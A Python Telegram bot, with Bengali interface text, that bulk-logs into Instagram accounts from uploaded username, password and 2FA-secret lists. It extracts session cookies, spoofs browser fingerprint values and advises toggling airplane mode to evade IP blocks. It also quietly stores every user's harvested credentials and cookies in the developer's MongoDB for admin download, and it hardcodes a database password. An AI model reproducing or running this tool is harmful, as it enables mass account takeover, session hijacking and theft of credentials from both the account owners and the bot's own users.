import telebot
import pyotp
import instaloader
import os
import sys
import time
import openpyxl
import random
import threading
import logging
import urllib.parse
from pymongo import MongoClient
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from concurrent.futures import ThreadPoolExecutor

# Suppress unnecessary logs
telebot.logger.setLevel(logging.CRITICAL)
logging.getLogger("urllib3").setLevel(logging.CRITICAL)

# ========== ADMIN SETUP ==========
ADMIN_ID = 6412225513 # আপনার টেলিগ্রাম আইডি

# ========== MONGODB SETUP ==========
password = urllib.parse.quote_plus("aass1122@")
MONGO_URI = f"mongodb+srv://kamrolhasandeveloper:{password}@cluster0.gxc2lwl.mongodb.net/?appName=Cluster0"

try:
    client = MongoClient(MONGO_URI)
    db = client['Cooking6545bot'] 
    print("\033[1;32m✅ MongoDB Connected Successfully!\033[0m")
except Exception as e:
    print(f"\033[1;31m❌ MongoDB Connection Failed: {e}\033[0m")
    sys.exit()

def is_authorized(user_id):
    """Check if a user is an admin or in the authorized database."""
    if user_id == ADMIN_ID:
        return True
    user = db['authorized_users'].find_one({"user_id": user_id})
    return bool(user)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    banner = """
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m    🔥 MASS IG COOKIE EXTRACTOR (ADMIN V2) 🔥
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;33m[+] Developer : \033[1;37mKamrol
\033[1;33m[+] Version   : \033[1;37m16.0 (Enhanced Admin Panel)
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m
    """
    print(banner)

show_banner()
while True:
    # You can directly assign TOKEN = "your_token" here to avoid input every time
    TOKEN = input("\033[1;32m🔑 Enter Your Telegram Bot Token: \033[0m").strip()
    if TOKEN:
        break

bot = telebot.TeleBot(TOKEN)
user_sessions = {}

def get_main_menu(user_id):
    """Generate the main reply keyboard."""
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("🚀 Start Processing"), KeyboardButton("❓ Help"))
    
    if user_id == ADMIN_ID:
        markup.add(KeyboardButton("👑 Admin Panel"))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not is_authorized(message.chat.id):
        bot.send_message(message.chat.id, "🚫 *Access Denied!*\nআপনি এই বটটি ব্যবহার করার জন্য অনুমোদিত নন।", parse_mode='Markdown')
        return
        
    welcome_text = (
        "🔥 *MASS IG Extractor PRO (Live Sync)* 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "✅ *সেফ সিস্টেম:* আপনার মোবাইলের রিয়েল আইপি দিয়ে কাজ করবে, কোনো আইডি নষ্ট হবে না!\n"
        "👉 আপনার `.xlsx` (Excel) ফাইলটি আপলোড করুন।\n"
        "• কলাম A = Username | কলাম B = Pass | কলাম C = 2FA Key\n"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_menu(message.chat.id), parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text in ["👑 Admin Panel", "🚀 Start Processing", "❓ Help"])
def handle_menu_buttons(message):
    chat_id = message.chat.id
    text = message.text

    if text == "👑 Admin Panel":
        if chat_id != ADMIN_ID:
            return
        
        # Enhanced Admin Panel Layout
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("➕ Add User", callback_data="admin_add_user"), InlineKeyboardButton("➖ Remove User", callback_data="admin_remove_user"))
        markup.row(InlineKeyboardButton("👥 View All Users", callback_data="admin_view_users"), InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"))
        markup.row(InlineKeyboardButton("📋 DL Raw Data", callback_data="admin_dl_raw"), InlineKeyboardButton("🍪 DL Cookies", callback_data="admin_dl_cookies"))
        markup.row(InlineKeyboardButton("🗑 Clear Database", callback_data="admin_clear_db"))
        
        auth_count = db['authorized_users'].count_documents({})
        acc_count = db['good_accounts'].count_documents({})
        
        text_msg = (
            "👑 *Welcome to Admin Panel*\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 *Authorized Users:* {auth_count}\n"
            f"📦 *Saved Cookies in DB:* {acc_count}\n\n"
            "👇 Select an action below:"
        )
        bot.send_message(ADMIN_ID, text_msg, reply_markup=markup, parse_mode="Markdown")

    elif text == "🚀 Start Processing":
        bot.send_message(chat_id, "👉 দয়া করে আপনার `.xlsx` ফাইলটি আপলোড করুন অথবা `user|pass|2fa` ফরম্যাটে টেক্সট পাঠান।")
        
    elif text == "❓ Help":
        help_txt = "💡 *কীভাবে ব্যবহার করবেন?*\n\n১. একটি `.xlsx` ফাইলে কলাম A তে ইউজারনেম, B তে পাসওয়ার্ড এবং C তে 2FA বসিয়ে সেভ করুন।\n২. ফাইলটি এখানে আপলোড করুন।\n৩. কাজ শুরু করতে বাটনে চাপ দিন।"
        bot.send_message(chat_id, help_txt, parse_mode="Markdown")

def add_user_step(message):
    try:
        uid = int(message.text.strip())
        db['authorized_users'].update_one({"user_id": uid}, {"$set": {"user_id": uid}}, upsert=True)
        bot.send_message(ADMIN_ID, f"✅ User `{uid}` is now authorized!", parse_mode="Markdown")
    except:
        bot.send_message(ADMIN_ID, "❌ Invalid Telegram ID!")

def remove_user_step(message):
    try:
        uid = int(message.text.strip())
        result = db['authorized_users'].delete_one({"user_id": uid})
        if result.deleted_count > 0:
            bot.send_message(ADMIN_ID, f"✅ User `{uid}` has been removed successfully!", parse_mode="Markdown")
        else:
            bot.send_message(ADMIN_ID, f"⚠️ User `{uid}` was not found in the database.", parse_mode="Markdown")
    except:
        bot.send_message(ADMIN_ID, "❌ Invalid Telegram ID!")

def broadcast_step(message):
    broadcast_text = message.text
    users = db['authorized_users'].find({})
    success = 0
    failed = 0
    
    bot.send_message(ADMIN_ID, "⏳ Broadcasting message, please wait...")
    
    for user in users:
        try:
            bot.send_message(user['user_id'], f"📢 *Admin Notice:*\n\n{broadcast_text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.1) # Prevent flood wait
        except Exception:
            failed += 1
            
    bot.send_message(ADMIN_ID, f"✅ *Broadcast Complete!*\nSuccessfully sent: {success}\nFailed: {failed}", parse_mode="Markdown")

def dl_admin_raw(chat_id):
    docs = list(db['good_accounts'].find({}))
    if not docs:
        bot.send_message(chat_id, "❌ Database is empty!")
        return
    
    wb = openpyxl.Workbook()
    ws = wb.active
    for doc in docs:
        ws.append([doc.get('username',''), doc.get('password',''), doc.get('2fa','')])
    
    filename = "Admin_Raw_Data.xlsx"
    wb.save(filename)
    with open(filename, "rb") as f:
        bot.send_document(chat_id, f, caption=f"📋 Raw Data Saved Accounts: {len(docs)}")
    os.remove(filename)

def dl_admin_cookies(chat_id, fmt):
    docs = list(db['good_accounts'].find({}))
    if not docs:
        bot.send_message(chat_id, "❌ Database is empty!")
        return
    
    if fmt == "xlsx":
        wb = openpyxl.Workbook()
        ws = wb.active
        for doc in docs:
            ws.append([f"{doc.get('username','')}|{doc.get('password','')}|{doc.get('cookies','')}"])
        filename = "Admin_Cookies.xlsx"
        wb.save(filename)
    else:
        filename = "Admin_Cookies.txt"
        with open(filename, "w", encoding="utf-8") as f:
            for doc in docs:
                f.write(f"{doc.get('username','')}|{doc.get('password','')}|{doc.get('cookies','')}\n")
    
    with open(filename, "rb") as f:
        bot.send_document(chat_id, f, caption=f"🍪 Cookies Backup Accounts: {len(docs)}")
    os.remove(filename)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    if not is_authorized(chat_id): return
    if chat_id in user_sessions and user_sessions[chat_id].get('is_processing'): return

    try:
        file_name = message.document.file_name.lower()
        if not file_name.endswith('.xlsx'):
            bot.send_message(chat_id, "❌ দয়া করে শুধুমাত্র .xlsx (Excel) ফাইল আপলোড করুন!")
            return

        bot.send_message(chat_id, "📥 ফাইল রিসিভ হচ্ছে, একটু অপেক্ষা করুন...")
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        input_filename = f"input_{chat_id}.xlsx"
        with open(input_filename, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        wb = openpyxl.load_workbook(input_filename)
        sheet = wb.active
        
        valid_accounts = []
        for row in sheet.iter_rows(values_only=True):
            if len(row) >= 3 and row[0] and row[1] and row[2]:
                user = str(row[0]).strip()
                if user.lower() in ['username', 'user', 'id', 'user name']: continue
                valid_accounts.append((user, str(row[1]).strip(), str(row[2]).strip()))

        os.remove(input_filename)

        if not valid_accounts:
            bot.send_message(chat_id, "❌ ফাইলে কোনো সঠিক ডেটা পাওয়া যায়নি!")
            return

        user_sessions[chat_id] = {
            'remaining': valid_accounts.copy(),
            'good': [], 'bad': [], 'suspended': [],            
            'is_processing': False, 'stop_requested': False
        }

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("▶️ Start Auto Processing", callback_data="start_batch"))
        bot.send_message(chat_id, f"✅ *ফাইল রিসিভ হয়েছে!*\n📦 *অ্যাকাউন্ট:* {len(valid_accounts)}\n\n👇 কাজ শুরু করতে বাটনে ক্লিক করুন:", reply_markup=markup, parse_mode='Markdown')
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ ফাইল রিড করতে সমস্যা হয়েছে: {e}")

@bot.message_handler(func=lambda m: '|' in m.text)
def handle_text_accounts(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    if not is_authorized(chat_id): return
    if chat_id in user_sessions and user_sessions[chat_id].get('is_processing'): return

    lines = text.split('\n')
    valid_accounts = []
    
    for line in lines:
        parts = line.split('|')
        if len(parts) >= 3:
            user = parts[0].strip()
            if user.lower() in ['username', 'user', 'id', 'user name']: continue
            valid_accounts.append((user, parts[1].strip(), parts[2].strip()))

    if not valid_accounts: return

    user_sessions[chat_id] = {
        'remaining': valid_accounts.copy(),
        'good': [], 'bad': [], 'suspended': [],            
        'is_processing': False, 'stop_requested': False
    }

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("▶️ Start Auto Processing", callback_data="start_batch"))
    bot.send_message(chat_id, f"✅ *টেক্সট রিসিভ হয়েছে!*\n📦 *অ্যাকাউন্ট:* {len(valid_accounts)}\n\n👇 কাজ শুরু করতে বাটনে ক্লিক করুন:", reply_markup=markup, parse_mode='Markdown')

def batch_processor(chat_id):
    session = user_sessions[chat_id]
    session['is_processing'] = True
    session['stop_requested'] = False
    
    batch = session['remaining'][:100]
    session['remaining'] = session['remaining'][100:]
    unprocessed = []

    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🛑 Stop", callback_data="stop_batch"), InlineKeyboardButton("📥 Live Download", callback_data="live_download"))

    process_msg = bot.send_message(
        chat_id, 
        f"🔄 *Processing {len(batch)} Accounts...*\n\n"
        f"🟢 Good: {len(session['good'])} | 🔴 Bad: {len(session['bad'])} | 🟡 Susp: {len(session['suspended'])}\n\n", 
        reply_markup=markup, parse_mode='Markdown'
    )

    def worker(acc):
        if session['stop_requested']:
            unprocessed.append(acc)
            return
            
        username, password, two_fa = acc
        time.sleep(0.01) 
        
        try:
            totp = pyotp.TOTP(two_fa.replace(" ", ""))
            two_fa_code = totp.now()

            L = instaloader.Instaloader()
            
            try:
                L.login(username, password)
            # ১. ১০০% ভুল পাসওয়ার্ড কনফার্ম হলে
            except instaloader.exceptions.BadCredentialsException:
                session['bad'].append(acc)
                return
            # ২. 2FA এর জন্য
            except instaloader.exceptions.TwoFactorAuthRequiredException:
                try:
                    L.two_factor_login(two_fa_code)
                except instaloader.exceptions.BadCredentialsException:
                    session['bad'].append(acc) # 2FA বা পাসওয়ার্ড ভুল
                    return
                except Exception as e:
                    err_msg = str(e).lower()
                    if "checkpoint" in err_msg or "challenge" in err_msg or "disabled" in err_msg or "consent" in err_msg:
                        session['suspended'].append(acc)
                    else:
                        unprocessed.append(acc)
                    return
            # ৩. কানেকশন বা অন্যান্য এরর (IP Block, Checkpoint)
            except instaloader.exceptions.ConnectionException as e:
                err_msg = str(e).lower()
                if "429" in err_msg or "too many requests" in err_msg:
                    unprocessed.append(acc) # আইপি ব্লক
                    return
                elif "checkpoint" in err_msg or "challenge" in err_msg or "disabled" in err_msg or "consent" in err_msg:
                    session['suspended'].append(acc) # কনফার্ম সাসপেন্ড
                    return
                else:
                    unprocessed.append(acc) # 400 বা 403 অনেক সময় IP ব্লকের কারণে দেয়, তাই Unprocessed এ রাখা হলো
                    return
            except Exception as e:
                err_msg = str(e).lower()
                if "checkpoint" in err_msg or "challenge" in err_msg or "disabled" in err_msg or "consent" in err_msg:
                    session['suspended'].append(acc)
                else:
                    unprocessed.append(acc)
                return

            # কুকিজ এক্সট্রাক্ট করা হচ্ছে
            cookie_dict = {cookie.name: cookie.value for cookie in L.context._session.cookies}
            
            # ১. চেক করা হচ্ছে আসল sessionid পাওয়া গেছে কি না
            if 'sessionid' not in cookie_dict:
                # 2FA বা পাসওয়ার্ড নেওয়ার পরও যদি sessionid না দেয়, মানে আইডি সাথে সাথে চেকপয়েন্ট খেয়েছে
                session['suspended'].append(acc)
                return

            # ২. ডিফল্ট ব্রাউজার ফুটপ্রিন্ট সেট করা
            if 'wd' not in cookie_dict: cookie_dict['wd'] = f"{random.randint(360, 501)}x{random.randint(700, 954)}"
            if 'dpr' not in cookie_dict: cookie_dict['dpr'] = str(random.choice([2, 2.5, 3]))
            
            # ৩. sessionid থেকে ds_user_id বের করা (রিয়েল সেশনের জন্য খুবই জরুরি)
            if 'ds_user_id' not in cookie_dict and 'sessionid' in cookie_dict:
                try:
                    cookie_dict['ds_user_id'] = cookie_dict['sessionid'].split('%3A')[0]
                except:
                    pass
            
            # ৪. রিয়েল ব্রাউজারের মতো একদম সঠিক অর্ডারে কুকিজ সাজানো
            keys_order = ['datr', 'ig_did', 'mid', 'shbid', 'shbts', 'csrftoken', 'ds_user_id', 'sessionid', 'wd', 'dpr', 'rur']
            final_cookies = []
            
            for k in keys_order:
                if k in cookie_dict:
                    final_cookies.append(f"{k}={cookie_dict[k]}")
                    
            # বাকি অন্য কোনো কুকি থাকলে সেটাও অ্যাড করে দেওয়া
            for k, v in cookie_dict.items():
                if k not in keys_order: 
                    final_cookies.append(f"{k}={v}")
                    
            raw_cookie_string = "; ".join(final_cookies)
            session['good'].append((username, password, two_fa, raw_cookie_string))

        except Exception:
            unprocessed.append(acc) 

    # Running workers in parallel
    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.map(worker, batch)

    if unprocessed:
        session['remaining'] = unprocessed + session['remaining']

    session['is_processing'] = False
    remaining_count = len(session['remaining'])

    try: bot.delete_message(chat_id, process_msg.message_id)
    except: pass

    markup = InlineKeyboardMarkup()
    if session['stop_requested']:
        if remaining_count > 0:
            markup.row(InlineKeyboardButton("▶️ Resume", callback_data="start_batch"))
        markup.row(InlineKeyboardButton("📥 Backup (Pause)", callback_data="download_files_pause"))
        markup.row(InlineKeyboardButton("⏹ Finish & Clear", callback_data="download_files_finish"))
        bot.send_message(chat_id, f"⏸ *কাজ থামানো হয়েছে!*\n🟢 Good: {len(session['good'])} | 🔴 Bad: {len(session['bad'])} | 🟡 Susp: {len(session['suspended'])}\n📦 বাকি আছে: {remaining_count} টি", reply_markup=markup, parse_mode='Markdown')
    elif remaining_count > 0:
        markup.add(InlineKeyboardButton(f"▶️ Resume Next 100", callback_data="start_batch"))
        markup.add(InlineKeyboardButton("📥 Backup (Pause)", callback_data="download_files_pause"))
        bot.send_message(chat_id, f"✅ *100 Accounts Done!*\n\n⚠️ *আপনার ফোনের 'ফ্লাইট মোড (Airplane Mode)' ২ সেকেন্ডের জন্য অন-অফ করুন (নতুন আইপি পেতে)।*\n\nএরপর 'Resume Next 100' বাটনে চাপ দিন:", reply_markup=markup, parse_mode='Markdown')
    else:
        markup.add(InlineKeyboardButton("📥 Download Final Files", callback_data="download_files_finish"))
        bot.send_message(chat_id, f"🎉 *সবগুলোর কাজ শেষ!*\n🟢 Good: {len(session['good'])} | 🔴 Bad: {len(session['bad'])} | 🟡 Susp: {len(session['suspended'])}", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    data = call.data
    
    # Admin Callbacks
    if data.startswith("admin_"):
        if chat_id != ADMIN_ID: return
        
        if data == "admin_add_user":
            msg = bot.send_message(ADMIN_ID, "দয়া করে নতুন ইউজারের Telegram ID দিন:")
            bot.register_next_step_handler(msg, add_user_step)
            
        elif data == "admin_remove_user":
            msg = bot.send_message(ADMIN_ID, "যাকে রিমুভ করবেন তার Telegram ID দিন:")
            bot.register_next_step_handler(msg, remove_user_step)
            
        elif data == "admin_view_users":
            users = list(db['authorized_users'].find({}))
            if not users:
                bot.send_message(ADMIN_ID, "❌ No authorized users found.")
            else:
                user_list = "\n".join([f"👤 `{u['user_id']}`" for u in users])
                bot.send_message(ADMIN_ID, f"👥 *Authorized Users List:*\n\n{user_list}\n\n*Total:* {len(users)}", parse_mode="Markdown")
            try: bot.answer_callback_query(call.id)
            except: pass
            
        elif data == "admin_broadcast":
            msg = bot.send_message(ADMIN_ID, "📢 দয়া করে আপনার মেসেজটি টাইপ করুন। এটি সকল অ্যাপ্রুভড ইউজারের কাছে পাঠানো হবে:")
            bot.register_next_step_handler(msg, broadcast_step)
            
        elif data == "admin_clear_db":
            db['good_accounts'].delete_many({})
            try: bot.answer_callback_query(call.id, "✅ Database Cleared!", show_alert=True)
            except: pass
            
        elif data == "admin_dl_raw":
            dl_admin_raw(ADMIN_ID)
            try: bot.answer_callback_query(call.id)
            except: pass
            
        elif data == "admin_dl_cookies":
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("📄 .TXT Format", callback_data="admin_dl_format_txt"), InlineKeyboardButton("📊 .XLSX Format", callback_data="admin_dl_format_xlsx"))
            bot.send_message(ADMIN_ID, "📁 কোন ফরম্যাটে ডাউনলোড করতে চান?", reply_markup=markup)
            try: bot.answer_callback_query(call.id)
            except: pass
            
        elif data.startswith("admin_dl_format_"):
            fmt = data.split("_")[-1]
            dl_admin_cookies(ADMIN_ID, fmt)
            try: bot.delete_message(ADMIN_ID, call.message.message_id)
            except: pass
        return

    # User Callbacks
    if chat_id not in user_sessions:
        try: bot.answer_callback_query(call.id, "❌ কোনো রানিং সেশন নেই। ফাইল আবার আপলোড করুন।", show_alert=True)
        except: pass
        return

    session = user_sessions[chat_id]

    if data == "start_batch":
        if session['is_processing']: return
        try: bot.delete_message(chat_id, call.message.message_id)
        except: pass
        threading.Thread(target=batch_processor, args=(chat_id,)).start()
        return

    if data == "stop_batch":
        if session['is_processing']:
            session['stop_requested'] = True
            try: bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🛑 *Stopping...*\n(কাজ সেভ হচ্ছে, অপেক্ষা করুন...)", parse_mode='Markdown')
            except: pass
        return

    if data in ["live_download", "download_files_pause", "download_files_finish"]:
        if ("pause" in data or "finish" in data) and session.get('is_processing'): return
        action = "live" if data == "live_download" else ("pause" if "pause" in data else "finish")
        
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("📄 .TXT", callback_data=f"dl_txt_{action}"), InlineKeyboardButton("📊 .XLSX", callback_data=f"dl_xlsx_{action}"))
        bot.send_message(chat_id, "📁 *কোন ফরম্যাটে ফাইল চান?*", reply_markup=markup, parse_mode='Markdown')
        return

    if data.startswith("dl_"):
        parts = data.split('_')
        file_format = parts[1]
        action = parts[2]
        
        try: bot.delete_message(chat_id, call.message.message_id)
        except: pass
        
        is_final = (action == "finish")
        is_live = (action == "live")
        
        send_final_files(chat_id, is_final=is_final, is_live=is_live, file_format=file_format)

def send_final_files(chat_id, is_final=True, is_live=False, file_format="xlsx"):
    session = user_sessions.get(chat_id)
    if not session: return

    msg = bot.send_message(chat_id, f"📦 *{file_format.upper()} ফাইল তৈরি করা হচ্ছে...*", parse_mode='Markdown')

    # MongoDB Backup
    if session['good'] and (is_final or is_live):
        try:
            collection = db['good_accounts']
            docs = [{"username": res[0], "password": res[1], "2fa": res[2], "cookies": res[3]} for res in session['good']]
            if docs: collection.insert_many(docs)
        except: pass

    def create_and_send(data_list, filename_prefix, caption_text, is_good_file=False):
        if not data_list: return 
        try:
            if file_format == "xlsx":
                wb = openpyxl.Workbook()
                ws = wb.active
                for res in data_list:
                    if is_good_file:
                        ws.append([f"{res[0]}|{res[1]}|{res[3]}"]) 
                    else:
                        ws.append([res[0], res[1], res[2]]) 
                filename = f"{filename_prefix}_{chat_id}.xlsx"
                wb.save(filename)
            else:
                filename = f"{filename_prefix}_{chat_id}.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    for res in data_list:
                        if is_good_file:
                            f.write(f"{res[0]}|{res[1]}|{res[3]}\n")
                        else:
                            f.write(f"{res[0]}|{res[1]}|{res[2]}\n")
            
            with open(filename, "rb") as f:
                bot.send_document(chat_id, f, caption=caption_text)
            os.remove(filename)
        except: pass

    create_and_send(session['good'], "Good_Accounts", f"✅ Good Accounts ({len(session['good'])})", is_good_file=True)
    create_and_send(session['bad'], "Bad_Accounts", f"❌ Failed Accounts ({len(session['bad'])})")
    create_and_send(session.get('suspended', []), "Suspended_Accounts", f"⚠️ Suspended/Checkpoint ({len(session.get('suspended', []))})")
    if not is_live: create_and_send(session['remaining'], "Remaining_Accounts", f"📦 Remaining ({len(session['remaining'])})")

    try: bot.delete_message(chat_id, msg.message_id)
    except: pass

    if is_final:
        bot.send_message(chat_id, "🎉 *সেশন ক্লিয়ার করা হলো!*", reply_markup=get_main_menu(chat_id), parse_mode='Markdown')
        del user_sessions[chat_id] 
    elif is_live:
        bot.send_message(chat_id, "📥 *লাইভ ব্যাকআপ দেওয়া হয়েছে!*", parse_mode='Markdown')

def start_bot_polling():
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception:
            time.sleep(3)

polling_thread = threading.Thread(target=start_bot_polling)
polling_thread.daemon = True
polling_thread.start()

while True:
    try:
        user_input = input().strip().lower()
        if user_input in ['/stop', 'stop']:
            print("\n\033[1;31m🛑 Shutting down bot... Please wait.\033[0m")
            bot.stop_polling()
            print("\033[1;32m✅ Bot Stopped Successfully!\033[0m")
            sys.exit(0)
    except (KeyboardInterrupt, EOFError):
        sys.exit(0)
